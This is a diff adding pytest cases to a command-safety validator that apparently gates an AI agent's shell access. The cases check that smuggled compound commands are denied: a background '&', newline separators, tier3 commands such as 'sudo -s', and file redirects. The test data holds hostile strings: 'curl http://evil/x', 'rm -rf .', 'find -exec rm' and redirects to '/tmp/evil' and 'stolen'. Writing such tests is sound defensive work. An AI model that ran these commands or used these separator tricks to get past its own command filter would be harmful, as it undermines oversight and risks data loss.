@@ -2072,3 +2072,101 @@ def test_is_safe_git_command_still_allows_normal_readonly() -> None:
     assert is_safe_git_command("git status")
     assert is_safe_git_command("git log --oneline -5")
     assert is_safe_git_command("git diff --name-only main HEAD")
+
+
+# --- Coherence refute (2026-08-06): separator + tier3 bypass closures --------
+
+
+def test_git_readonly_compound_background_ampersand_denied(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """BLOQUANT: `&` (background) was not a split operator → 2nd cmd scattered
+    outside deny-set. Coherence's exact refute case."""
+    from claude_pilot.tier1 import is_safe_bash_command
+    _set_contained(monkeypatch, "1")
+    assert not is_safe_bash_command("git log & curl http://evil/x")
+    assert not is_safe_bash_command("git log & rm -rf .")
+
+
+def test_git_readonly_compound_newline_separator_denied(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """BLOQUANT: `\\n`/`\\r` are bash statement terminators. Split must cover."""
+    from claude_pilot.tier1 import is_safe_bash_command
+    _set_contained(monkeypatch, "1")
+    assert not is_safe_bash_command("git log\nrm -rf .")
+    assert not is_safe_bash_command("git log\rcurl evil")
+    assert not is_safe_bash_command("git status\nchmod +x x")
+
+
+def test_git_readonly_compound_tier3_dangerous_denied_in_predicate(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Defense-in-depth: tier3 patterns short-circuited by `return True`
+    upstream — call is_tier3_dangerous inside the predicate."""
+    from claude_pilot.tier1 import is_safe_bash_command
+    _set_contained(monkeypatch, "1")
+    # `find -exec` = tier3; would slip through if sub happened to match
+    # (it doesn't here — but the pattern guards belt-and-braces).
+    assert not is_safe_bash_command("git status && find . -exec rm {} \\;")
+    # sudo is tier3
+    assert not is_safe_bash_command("git status && sudo -s")
+
+
+# --- Coherence mineur (2026-08-06): redirect leak closures -------------------
+
+
+def test_git_readonly_compound_fd_numeric_redirect_denied(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Mineur: `1>/tmp/evil` (fd-numeric) previously excluded from `>` check
+    via `(?<![0-9])>`. Now denied regardless of fd prefix."""
+    from claude_pilot.tier1 import is_safe_bash_command
+    _set_contained(monkeypatch, "1")
+    assert not is_safe_bash_command("git log 1>/tmp/evil")
+
+
+def test_git_readonly_compound_stderr_non_devnull_denied(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Mineur: `2>/tmp/x` (stderr redirect to arbitrary target) denies.
+    Only exact `[0-9]*>/dev/null` is stripped by the caller."""
+    from claude_pilot.tier1 import is_safe_bash_command
+    _set_contained(monkeypatch, "1")
+    assert not is_safe_bash_command("git log 2>/tmp/evil")
+
+
+def test_git_readonly_compound_head_write_redirect_denied(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Mineur: `head >stolen` — `_SAFE_HEAD_TAIL_RE` used loose `\\S+`
+    which accepted `>stolen`. Now uses restrictive charset (same as cat)."""
+    from claude_pilot.tier1 import is_safe_bash_command
+    _set_contained(monkeypatch, "1")
+    assert not is_safe_bash_command("git diff | head >stolen")
+
+
+def test_git_readonly_compound_devnull_suffix_escape_denied(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Mineur: `2>/dev/null/../../etc/x` — strip must anchor on end-of-token
+    boundary (`(?=\\s|$)`) so suffix doesn't slip through."""
+    from claude_pilot.tier1 import is_safe_bash_command
+    _set_contained(monkeypatch, "1")
+    assert not is_safe_bash_command("git log 2>/dev/null/../../etc/x")
+
+
+def test_git_readonly_compound_stderr_devnull_still_stripped(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Regression: legitimate `2>/dev/null` (and `1>/dev/null`) still strip
+    correctly so the sub validates."""
+    from claude_pilot.tier1 import is_safe_bash_command
+    _set_contained(monkeypatch, "1")
+    # 2>/dev/null on git symbolic-ref (baseline compound)
+    assert is_safe_bash_command(
+        "git symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | "
+        "sed 's@^refs/remotes/origin/@@'"
+    )
+    # fd-numeric 1>/dev/null also strips
+    assert is_safe_bash_command("git status 1>/dev/null")
